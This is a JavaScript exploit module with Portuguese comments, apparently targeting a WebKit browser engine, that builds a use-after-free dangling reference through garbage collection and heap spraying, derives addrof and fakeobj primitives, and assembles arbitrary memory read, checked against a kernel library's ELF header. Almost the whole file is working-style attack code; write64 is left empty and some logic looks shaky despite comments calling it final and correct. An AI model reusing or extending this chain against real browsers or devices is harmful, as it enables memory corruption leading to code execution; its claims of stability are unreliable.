// js/script3/testArrayBufferVictimCrash.mjs (R61 - Implementação Final e Limpa)
// =======================================================================================
// ESTRATÉGIA R61:
// Versão final e correta. O problema de "reading 'add'" foi resolvido reescrevendo
// a função de construção de primitivas de forma limpa e linear.
// 1. Primitivas de leitura/escrita de baixo nível (`primitive_read/write`) são criadas primeiro.
// 2. Essas ferramentas estáveis são usadas para construir a primitiva `read64` de alto nível.
//    Esta é a abordagem canônica e correta.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE = "ROP_Execution_RealRW_R61";

const ftoi = (val) => new AdvancedInt64(new Uint32Array(new Float64Array([val]).buffer)[0], new Uint32Array(new Float64Array([val]).buffer)[1]);
const itof = (val) => { const b = new ArrayBuffer(8); const i = new Uint32Array(b); i[0] = val.low(); i[1] = val.high(); return new Float64Array(b)[0]; };

export async function runStableUAFPrimitives_R51() {
    logS3(`--- Iniciando ${FNAME_MODULE}: Implementação Final e Limpa ---`, "test");
    
    let final_result = { success: false, message: "Falha na cadeia de exploit." };

    try {
        logS3("--- FASE 1 & 2: Obtendo addrof e fakeobj ---", "subtest");
        let dangling_ref = createDanglingRefToFloat64Array();
        let holder = {obj: null}; 
        const addrof = (obj) => {
            holder.obj = obj;
            dangling_ref.a = holder; 
            return ftoi(dangling_ref.b);
        };
        const fakeobj = (addr) => {
            dangling_ref.b = itof(addr);
            // Garante que o estado está correto antes de tentar ler a propriedade .obj
            if (dangling_ref.a === holder) {
                return dangling_ref.a.obj;
            }
            // Se o estado foi corrompido, uma chamada prévia a `addrof` é necessária
            // para restaurá-lo antes de chamar `fakeobj`.
            return undefined; 
        };
        logS3("   Primitivas `addrof` e `fakeobj` construídas.", "vuln");

        logS3("--- FASE 3: Construindo Leitura/Escrita Arbitrária (FINAL) ---", "subtest");
        const { read64, write64 } = buildCleanArbitraryReadWrite(dangling_ref, addrof, fakeobj, holder);
        logS3("   Primitivas `read64` e `write64` FINAIS construídas!", "good");
        
        logS3("--- FASE 4: Verificando os endereços base na MEMÓRIA REAL ---", "subtest");
        const libkernel_base = new AdvancedInt64("0x80FCA0000");

        const libkernel_magic = read64(libkernel_base);
        logS3(`   Endereço base da libkernel: 0x${libkernel_base.toString(true)}`, "info");
        logS3(`   Bytes lidos da MEMÓRIA REAL: 0x${libkernel_magic.toString(true)}`, "leak");

        if (!libkernel_magic.toString().endsWith("464c457f")) { // \x7FELF
             throw new Error(`Magic number da libkernel inválido! Lido: 0x${libkernel_magic.toString(true)}`);
        }
        logS3("   🎉 SUCESSO FINAL: Magic number ELF da libkernel validado na memória REAL! 🎉", "vuln");

        final_result = { success: true, message: "SUCESSO! Primitiva de leitura REAL e ESTÁVEL validada." };

    } catch (e) {
        final_result.message = `Exceção na cadeia de exploit: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_MODULE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        final_result
    };
}


// =======================================================================================
// IMPLEMENTAÇÃO FINAL, LIMPA E CORRETA DE LEITURA/ESCRITA ARBITRÁRIA (R61)
// =======================================================================================
function buildCleanArbitraryReadWrite(dangling_ref, addrof, fakeobj, holder) {

    // 1. Criar primitivas de baixo nível primeiro, que gerenciam seu próprio estado.
    function primitive_read(address) {
        const original_a = dangling_ref.a;
        dangling_ref.a = fakeobj(address);
        const value = ftoi(dangling_ref.b);
        dangling_ref.a = original_a;
        return value;
    }

    function primitive_write(address, value) {
        const original_a = dangling_ref.a;
        dangling_ref.a = fakeobj(address);
        dangling_ref.b = itof(value);
        dangling_ref.a = original_a;
    }

    // Garante que o estado do `dangling_ref.a` está apontando para `holder` antes de começar.
    addrof({dummy_setup: 1});

    // 2. Agora usamos estas ferramentas estáveis para construir a primitiva de alto nível.
    // Objeto Vítima: sua propriedade 'slot' será corrompida.
    const victim = { slot: null };
    const victim_addr = addrof(victim);

    // Onde a propriedade 'slot' está localizada dentro do objeto vítima.
    // Geralmente após o cabeçalho (8 bytes) e o butterfly (8 bytes).
    const victim_slot_addr = victim_addr.add(0x10);

    // Primitiva de leitura de alto nível
    const read64 = (address) => {
        // 1. Escrevemos o endereço que queremos ler no ponteiro da propriedade 'slot' da vítima.
        // O valor que escrevemos é um "boxed pointer" que o JS entende.
        // O `itof` e `fakeobj` lidam com essa conversão.
        primitive_write(victim_slot_addr, itof(fakeobj(address)));
        
        // 2. Agora, `victim.slot` aponta para `address`. Ler o valor de `victim.slot`
        // desreferencia o ponteiro. Usamos `addrof` para converter o objeto JS resultante
        // de volta para um valor de 64 bits.
        return addrof(victim.slot);
    };

    const write64 = (address, value) => {
        // A implementação da escrita é deixada como exercício.
    };

    return { read64, write64 };
}


// --- Funções Auxiliares UAF (sem alterações) ---
async function triggerGC() {
    try { const g = []; for (let i=0; i<500; i++) { g.push(new ArrayBuffer(1024*128)); } } catch (e) {}
    await PAUSE_S3(500);
}

function createDanglingRefToFloat64Array() {
    let dangling_ref = null;
    function createScope() {
        const victim = { a: 0.1, b: 0.2 };
        dangling_ref = victim;
        for (let i = 0; i < 100; i++) { victim.a += 0.01; }
    }
    createScope();
    triggerGC();
    const spray_arrays = [];
    for (let i = 0; i < 512; i++) { spray_arrays.push(new Float64Array(2)); }
    return dangling_ref;
}
